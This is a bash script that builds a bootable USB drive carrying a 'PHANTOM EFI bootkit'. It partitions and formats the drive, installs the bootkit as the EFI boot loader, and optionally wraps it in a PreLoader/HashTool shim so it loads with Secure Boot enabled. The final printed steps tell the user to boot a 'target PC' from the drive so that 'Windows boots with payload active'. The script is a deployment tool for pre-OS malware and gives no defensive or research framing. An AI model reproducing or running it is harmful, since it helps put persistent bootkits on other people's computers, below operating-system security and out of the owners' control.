#!/bin/bash
# ────────────────────────────────────────────────────────────
#  PHANTOM USB Creator
#
#  Creates a bootable USB drive with the PHANTOM EFI bootkit.
#
#  Usage:
#    sudo ./create_usb.sh /dev/sdX
#    sudo ./create_usb.sh /dev/sdX --with-shim
#
#  The --with-shim option includes the PreLoader shim for
#  Secure Boot compatibility (requires hash enrollment).
# ────────────────────────────────────────────────────────────

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
BUILD_DIR="$PROJECT_DIR/build"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# check arguments
if [ $# -lt 1 ]; then
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          PHANTOM USB Creator             ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo "Usage: sudo $0 /dev/sdX [--with-shim]"
    echo ""
    echo "Options:"
    echo "  --with-shim    Include PreLoader for Secure Boot"
    echo ""
    echo -e "${RED}WARNING: This will ERASE the target device!${NC}"
    exit 1
fi

DEVICE="$1"
WITH_SHIM=0

if [ "$2" = "--with-shim" ]; then
    WITH_SHIM=1
fi

# safety checks
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Must run as root${NC}"
    exit 1
fi

if [ ! -b "$DEVICE" ]; then
    echo -e "${RED}[!] $DEVICE is not a block device${NC}"
    exit 1
fi

# check for the built EFI binary
EFI_BIN="$BUILD_DIR/efi/bootx64.efi"
if [ ! -f "$EFI_BIN" ]; then
    echo -e "${RED}[!] bootx64.efi not found. Run 'make' first.${NC}"
    exit 1
fi

echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║          PHANTOM USB Creator             ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[!] Target device: $DEVICE${NC}"
echo -e "${RED}[!] ALL DATA WILL BE ERASED${NC}"
echo ""
read -p "Continue? (y/N) " -n 1 -r
echo ""

if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "[*] Aborted."
    exit 0
fi

echo -e "${GREEN}[*] Creating partition table...${NC}"
# create GPT partition table with EFI System Partition
parted -s "$DEVICE" mklabel gpt
parted -s "$DEVICE" mkpart EFI fat32 1MiB 100%
parted -s "$DEVICE" set 1 esp on

# wait for partition device to appear
sleep 2
PARTITION="${DEVICE}1"
if [ ! -b "$PARTITION" ]; then
    PARTITION="${DEVICE}p1"
fi

echo -e "${GREEN}[*] Formatting as FAT32...${NC}"
mkfs.vfat -F 32 -n "PHANTOM" "$PARTITION"

echo -e "${GREEN}[*] Mounting...${NC}"
MOUNT_DIR=$(mktemp -d)
mount "$PARTITION" "$MOUNT_DIR"

echo -e "${GREEN}[*] Installing PHANTOM EFI bootkit...${NC}"
mkdir -p "$MOUNT_DIR/EFI/BOOT"

if [ $WITH_SHIM -eq 1 ]; then
    # with Secure Boot shim:
    #   bootx64.efi = PreLoader (loads loader.efi)
    #   loader.efi  = our bootkit
    #   HashTool.efi = for hash enrollment

    SHIM_DIR="$PROJECT_DIR/shim"
    if [ -f "$SHIM_DIR/bootx64.efi" ] && [ -f "$SHIM_DIR/HashTool.efi" ]; then
        cp "$SHIM_DIR/bootx64.efi" "$MOUNT_DIR/EFI/BOOT/bootx64.efi"
        cp "$SHIM_DIR/HashTool.efi" "$MOUNT_DIR/EFI/BOOT/HashTool.efi"
        cp "$EFI_BIN" "$MOUNT_DIR/EFI/BOOT/loader.efi"
        echo -e "${GREEN}[+] Installed with Secure Boot shim${NC}"
    else
        echo -e "${YELLOW}[!] Shim files not found in $SHIM_DIR${NC}"
        echo -e "${YELLOW}[!] Falling back to direct boot${NC}"
        cp "$EFI_BIN" "$MOUNT_DIR/EFI/BOOT/bootx64.efi"
    fi
else
    # direct boot (Secure Boot must be disabled)
    cp "$EFI_BIN" "$MOUNT_DIR/EFI/BOOT/bootx64.efi"
    echo -e "${GREEN}[+] Installed in direct boot mode${NC}"
fi

echo -e "${GREEN}[*] Syncing...${NC}"
sync

echo -e "${GREEN}[*] Unmounting...${NC}"
umount "$MOUNT_DIR"
rmdir "$MOUNT_DIR"

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║          USB CREATION COMPLETE           ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Device: ${CYAN}$DEVICE${NC}"
echo -e "  Mode:   ${CYAN}$([ $WITH_SHIM -eq 1 ] && echo 'Secure Boot (shim)' || echo 'Direct (Secure Boot off)')${NC}"
echo ""
echo "  Boot instructions:"
echo "    1. Insert USB into target PC"
echo "    2. Enter BIOS (DEL/F2/F12 at boot)"
if [ $WITH_SHIM -eq 0 ]; then
    echo "    3. Disable Secure Boot"
fi
echo "    3. Set USB as first boot device"
echo "    4. Save and reboot"
echo "    5. PHANTOM will load → remove USB when prompted"
echo "    6. Press ENTER → Windows boots with payload active"
echo ""
